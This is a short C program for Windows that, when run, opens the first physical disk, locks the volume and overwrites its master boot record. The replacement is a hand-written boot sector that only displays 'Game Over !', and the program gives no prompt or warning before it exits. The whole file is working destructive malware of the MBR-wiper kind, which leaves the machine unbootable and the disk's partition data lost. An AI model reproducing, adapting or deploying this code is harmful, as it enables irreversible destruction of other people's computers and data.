#include<Windows.h>
#include<winioctl.h>

const unsigned char mbr[] = "\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x0b\x00\xb8\x01\x13\xbb\x0a"
							"\x00\xba\x1d\x0e\xcd\x10\xe2\xfe"
							"\x47\x61\x6d\x65\x20\x4f\x76\x65\x72\x20\x21";

int WINAPI WinMain
(
	HINSTANCE hInstance,
	HINSTANCE hinstance,
	LPSTR lPstr,
	int cmdshow
)
{
	DWORD dwReturn, dwWritesize;
	BYTE MBRdata[512] = { 0 };
	HANDLE FileHandle = NULL;
	MBRdata[510] = 0x55;
	MBRdata[511] = 0xAA;
	FileHandle = CreateFile
	(
		LPCSTR("\\\\.\\PHYSICALDRIVE0"),
		GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);
	if (FileHandle == INVALID_HANDLE_VALUE)
	{
		return -1;
	}
	DeviceIoControl
	(
		FileHandle,
		FSCTL_LOCK_VOLUME,
		NULL,
		0,
		NULL,
		0,
		&dwReturn,
		NULL
	);
	memcpy(MBRdata, mbr, sizeof(mbr) - 1);
	WriteFile(FileHandle, MBRdata, sizeof(MBRdata), &dwWritesize, NULL);
	DeviceIoControl
	(
		FileHandle,
		FSCTL_UNLOCK_VOLUME,
		NULL,
		0,
		NULL,
		0,
		&dwReturn,
		NULL
	);
	CloseHandle(FileHandle);
	ExitProcess(-1);
	return 0;
}